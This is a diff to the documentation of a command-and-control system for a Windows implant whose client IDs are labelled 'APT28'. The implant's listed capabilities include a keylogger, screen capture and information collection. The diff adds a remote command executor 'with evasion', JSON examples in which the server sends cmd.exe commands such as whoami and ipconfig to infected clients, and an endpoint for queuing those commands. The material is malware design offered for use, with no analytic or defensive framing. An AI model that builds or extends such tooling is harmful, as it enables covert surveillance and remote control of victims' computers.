@@ -14,6 +14,7 @@ Capabilities are invoked by numeric command IDs:
 - `3` - Keylogger (start_keylogger)
 - `4` - Screenshot (start_screenshot)
 - `5` - Info Collector (start_info_collector)
+- `6` - Command Executor (execute_command_with_evasion)
 - `0` - No Command (idle)
 
 ## API Endpoints
@@ -32,13 +33,25 @@ GET /api/register?id=APT28_1234_1701619200
 ### 2. Capability Command Fetch Endpoint
 **URL:** `GET /api/command?id=<client_id>`
 
-**Purpose:** Retrieve capability command ID to execute
+**Purpose:** Retrieve capability command ID and arguments to execute
 
-**Response:** Numeric command ID
+**Response:** JSON object with capability and args
+```json
+{
+  "capability": 6,
+  "args": "cmd.exe /c whoami"
+}
 ```
-Example Response:
-1
-(Would execute start_audio_recorder())
+
+Example:
+```
+GET /api/command?id=APT28_1234_1701619200
+
+Response:
+{
+  "capability": 6,
+  "args": "cmd.exe /c ipconfig /all"
+}
 ```
 
 ### 3. Report Endpoint
@@ -122,12 +135,43 @@ To change the C2 server URL and port, modify in `c2_handler.c`:
 #define C2_PORT 80
 ```
 
+## Sending Commands with Arguments
+
+The C2 server now supports passing arguments to capabilities:
+
+**POST to `/api/send_command`:**
+```json
+{
+  "client_id": "APT28_1234_1701619200",
+  "capability_id": 6,
+  "args": "cmd.exe /c whoami && ipconfig"
+}
+```
+
+**Argument Usage by Capability:**
+- **Capability 6 (Command Executor)**: Full command string (e.g., `"cmd.exe /c dir C:\\"`)
+- **Other Capabilities**: Reserved for future use (currently optional)
+
+**Client Fetches Command:**
+```json
+GET /api/command?id=APT28_1234_1701619200
+
+Response:
+{
+  "capability": 6,
+  "args": "cmd.exe /c whoami && ipconfig"
+}
+```
+
+The client parses the JSON response and executes the capability with the provided arguments.
+
 ## Implementation Notes
 
 - Uses Windows API exclusively (WinINet for HTTP communication)
 - Client ID includes process ID and timestamp for uniqueness
 - Communication is over HTTP (consider HTTPS for production environments)
-- JSON responses with basic formatting
+- JSON responses for command fetch (with capability and args)
+- Simple JSON parser implemented in C for client-side parsing
 - No authentication implemented
 - Capabilities are started as threads by the C2 handler
 
